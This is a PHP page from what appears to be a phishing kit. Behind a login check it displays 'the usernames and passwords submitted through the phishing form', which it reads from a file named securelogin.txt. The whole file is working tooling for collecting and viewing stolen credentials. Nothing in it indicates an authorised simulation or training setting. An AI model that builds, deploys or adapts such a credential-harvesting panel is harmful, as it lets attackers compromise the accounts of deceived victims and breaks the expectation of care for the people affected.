<?php
require_once 'auth.php';

// HTML authentication
authHTML();

include 'templates/header.php';

?>


<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="#">Project name</a>
        </div>
        <div id="navbar" class="collapse navbar-collapse">
            <ul class="nav navbar-nav">
                <li class="active"><a href="#">Home</a></li>
                <li><a href="logout.php">Logout</a></li>
            </ul>
        </div><!--/.nav-collapse -->
    </div>
</nav>

<div class="container">

    <div class="starter-template">
        <h1>Passwords</h1>
        <p class="lead">Here are the usernames and passwords submitted through the phishing form</p>
    </div>

<?php
$file = 'securelogin.txt';
$orig = file_get_contents($file);
$a = htmlentities($orig);

echo '<code>';
echo '<pre>';

echo $a;

echo '</pre>';
echo '</code>';
?>


</div><!-- /.container -->

<?php
include 'templates/footer.php';
